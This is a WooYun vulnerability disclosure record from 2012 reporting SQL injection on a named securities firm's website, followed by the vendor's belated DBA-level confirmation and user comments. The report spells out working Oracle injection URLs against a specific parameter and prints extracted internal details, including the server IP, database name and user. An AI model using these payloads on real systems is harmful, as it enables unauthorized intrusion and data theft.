{"id": 20694, "wybug_id": "wooyun-2012-05987", "wybug_title": "信达证券网站存在SQL注射漏洞", "wybug_corp": "信达证券", "wybug_author": "leaf", "wybug_date": "2012-04-12 16:10", "wybug_open_date": "2012-04-17 16:10", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-04-12：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2012-04-17：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 偶然浏览该站点，抱着试试看的心理改动了下地址栏的参数值...居然发现可注入！为了进一步证明漏洞存在，简单利用下获取到部分基本信息。望厂商尽快予以修复！ 详细说明：  http://www.cindasc.com/new/news/BaseInfo9.jsp?nav=1&stockCode=600001'%20and%20exists(select%20*%20from%20dual)--http://www.cindasc.com/new/news/BaseInfo9.jsp?nav=1&stockCode=600001'%20and%20(select%20count%20(*)%20from%20user_tables)>0--...http://www.cindasc.com/new/news/BaseInfo9.jsp?nav=1&stockCode=600001'%20order%20by%2013--...http://www.cindasc.com/new/news/BaseInfo9.jsp?nav=1&stockCode=600001'%20and%20(select%20count(*)%20from%20all_objects%20where%20object_name='UTL_HTTP')>0--...   漏洞证明：  注入点：http://www.cindasc.com/new/news/BaseInfo9.jsp?nav=1&stockCode=600001Web服务器主机信息: app01Web服务器IP地址: 172.20.2.67当前数据库名: WZGAZX30.REGRESS.RDBMS.DEV.US.ORACLE.COM数据库字符集: SIMPLIFIED CHINESE_CHINA.ZHS16GBK当前用户名: WZGAZX30数据库版本: Oracle Database 10g Enterprise Edition Release 10.2.0.1.0 - Prod   修复方案：  进行必要的过滤！   版权声明：转载请注明来源 leaf@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2012-04-17 16:10 厂商回复：  最新状态： 2012-04-18：报歉，没有及时确认。这个漏洞确认是高权限漏洞（DBA），可以利用进行进一步的渗透。同时，疑似存在其他非法用户添加的某系统用户。漏洞事件通过证券行业信息化主管部门（证监会信息中心）协调处置。向leaf致歉。对该漏洞评分如下：CVSS评分：(AV:R/AC:L/Au:NR/C:C/A:P/I:C/B:N) Score:9.67（最高10分，高危)即：远程攻击、攻击难度低、不需要用户认证，对机密性、完整性造成完全影响，对可用性造成部分。技术难度系数：1.0(一般，oracle的系统比较大)影响危害系数：1.4(较严重，涉及重要信息系统单位业务系统）综合评分：9.67*1.0*1.4=13.538 (rank 14)  ", "replys": "漏洞评价：\n评论\n     2012-04-12 17:25 |    \t\tcncert国家互联网应急中心(乌云厂商)\t\t \n  还正在跑，每回看到大站 oracle 的SQL都头大。要是白帽子们能多整点东西就好了。    \n     2012-04-12 18:28 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @cncert国家互联网应急中心 整什么东西？    \n     2012-04-12 20:36 |    \t\tz@cx \t\t\t( 普通白帽子  |\t\t\t        Rank:434 漏洞数:56        | 。-。-。)\t\t \n  @cncert国家互联网应急中心 同问，整啥东东。。。    \n     2012-04-13 13:32 |    \t\tpossible \t\t\t( 普通白帽子  |\t\t\t        Rank:373 漏洞数:32        | everything is possible!)\t\t \n  是不是 oracle注入神器呀,瞎猜    \n     2012-04-13 16:03 |    \t\tz@cx \t\t\t( 普通白帽子  |\t\t\t        Rank:434 漏洞数:56        | 。-。-。)\t\t \n  @possible 每次遇到ORACLE数据库就头疼，表太多。。。    \n     2012-04-13 16:04 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @z@cx 早些年遇到oracle一般都是拿系统权限的，oracle注射不像其他的，现在不知道是什么情况了    \n     2012-04-13 18:00 |    \t\tpossible \t\t\t( 普通白帽子  |\t\t\t        Rank:373 漏洞数:32        | everything is possible!)\t\t \n  @z@cx 哦 我还真没有单独利用oracle注入点，几次都是配置文件下载，直接找固定表和字段 没有体会到这种麻烦，有机会学习一下...    \n     2012-04-13 22:57 |    \t\thorseluke \t\t\t( 普通白帽子  |\t\t\t        Rank:116 漏洞数:18        | Realize the dream in earnest.)\t\t \n  @cncert国家互联网应急中心 同问整啥...证明的话，貌似导几条数据就成了吧...    \n     2012-04-14 01:18 |    \t\tz@cx \t\t\t( 普通白帽子  |\t\t\t        Rank:434 漏洞数:56        | 。-。-。)\t\t \n  @cncert国家互联网应急中心 中邮物流貌似还没有处理。。。    \n     2012-04-18 10:10 |    \t\tleaf \t\t\t( 普通白帽子  |\t\t\t        Rank:948 漏洞数:121        | 真的没影响么？)\t\t \n  @xsser @cncert国家互联网应急中心  之前看到“无影响厂商忽略”，心里拔凉拔凉的...现在终于恢复了...    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}